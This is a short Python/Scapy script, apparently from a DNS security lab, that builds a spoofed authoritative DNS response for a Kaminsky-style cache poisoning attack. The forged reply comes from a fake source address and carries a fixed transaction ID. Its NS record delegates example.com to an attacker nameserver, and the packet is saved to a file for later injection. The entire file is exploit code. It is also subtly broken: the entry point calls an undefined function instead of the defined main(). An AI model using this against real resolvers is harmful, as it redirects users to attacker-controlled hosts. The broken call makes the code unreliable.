from scapy.all import *

def main():
    ip = IP(src = '10.10.10.10', dst = '10.9.0.53', chksum=0)

    udp = UDP(sport = 53, dport = 33333, chksum = 0)

    name_with_start = 'twysw.example.com'
    name = 'example.com'
    Qdsec = DNSQR(qname=name_with_start)
    Anssec = DNSRR(rrname=name_with_start, type='A', rdata='1.1.1.1', ttl=259200)
    NSsec = DNSRR(rrname=name, type='NS', rdata='ns.attacker32.com', ttl=259200)
    dns = DNS(id = 0xAAAA, aa = 1, ra = 0, rd = 0, cd = 0, qr = 1, qdcount = 1, ancount = 1, nscount = 1, arcount = 0, qd = Qdsec, an = Anssec, ns = NSsec)

    response = ip / udp / dns
    
    with open('response.bin', 'wb') as f:
        f.write(bytes(response))

if __name__ == "__main__":
    response_packet()
